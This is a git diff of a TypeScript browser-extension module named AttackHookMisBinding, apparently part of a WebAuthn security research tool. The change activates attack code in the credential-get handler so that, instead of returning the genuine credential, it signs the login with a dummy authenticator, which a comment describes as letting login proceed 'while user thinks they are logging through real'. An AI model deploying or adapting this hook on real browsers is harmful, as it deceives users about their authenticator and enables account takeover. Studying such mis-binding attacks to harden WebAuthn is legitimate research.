@@ -1,6 +1,6 @@
 import { AttackHook } from './attack_hook';
 import { getOriginFromUrl, webauthnParse, webauthnStringify } from '../utils';
-import { generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../webauthn';
+import { generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError, generateKeyRequestAndAttestation } from '../webauthn';
 // import { generateKeyRequestAndAttestation, generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../webauthn';
 import { WebAuthnRequestMessage, WebAuthnResponseMessage, WebAuthnErrorMessage } from '../types/types';
 
@@ -72,45 +72,45 @@ export class AttackHookMisBinding extends AttackHook {
 
     async onCredentialGet(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
         this.logHelper('misbind onCredentialGet called:', msg, sender);
-        return {
-            type: 'sign_response',
-            requestID: msg.requestID,
-            credential: msg.originalCredential,
-        }
+        // return {
+        //     type: 'sign_response',
+        //     requestID: msg.requestID,
+        //     credential: msg.originalCredential,
+        // }
 
         //  Uncooment the following to allow login using the dummy authenticator while user thinks they are logging through real.
-        // const origin = getOriginFromUrl(sender.url);
-        // const opts = webauthnParse(msg.options);
+        const origin = getOriginFromUrl(sender.url!);
+        const opts = webauthnParse(msg.options);
 
-        // log.debug(opts);
-        // // const pin = await requestPin(sender.tab.id, origin);
-        // log.debug('Origin in background sign function', origin);
+        this.logHelper(opts);
+        // const pin = await requestPin(sender.tab.id, origin);
+        this.logHelper('Origin in background sign function', origin);
 
-        // try {
-        //     const credential = await generateKeyRequestAndAttestation(origin, opts.publicKey, `9999`);
-        //     const authenticatedResponseData = {
-        //         credential: webauthnStringify(credential),
-        //         requestID: msg.requestID,
-        //         type: 'sign_response',
-        //     };
-        //     log.debug(msg);
-        //     log.debug('auth credential');
-        //     log.debug(credential);
-        //     log.debug(webauthnStringify(credential));
-        //     return authenticatedResponseData;
-        // } catch (e) {
-        //     if (e instanceof DOMException) {
-        //         const { code, message, name } = e;
-        //         log.error('failed to sign due DOMException', { code, message, name }, e);
-        //     } else {
-        //         log.error('failed to sign', { errorType: `${(typeof e)}` }, e);
-        //     }
+        try {
+            const credential = await generateKeyRequestAndAttestation(origin!, opts.publicKey, `9999`);
+            const authenticatedResponseData: WebAuthnResponseMessage = {
+                credential: webauthnStringify(credential),
+                requestID: msg.requestID,
+                type: 'sign_response',
+            };
+            this.logHelper(msg);
+            this.logHelper('auth credential');
+            this.logHelper(credential);
+            this.logHelper(webauthnStringify(credential));
+            return authenticatedResponseData;
+        } catch (e) {
+            if (e instanceof DOMException) {
+                const { code, message, name } = e;
+                this.logHelper('failed to sign due DOMException', { code, message, name }, e);
+            } else {
+                this.logHelper('failed to sign', { errorType: `${(typeof e)}` }, e);
+            }
 
-        //     return {
-        //         requestID: msg.requestID,
-        //         type: 'error',
-        //         exception: e.toString()
-        //     };
-        // }
+            return {
+                requestID: msg.requestID,
+                type: 'error',
+                exception: e!.toString()
+            };
+        }
     }
 }
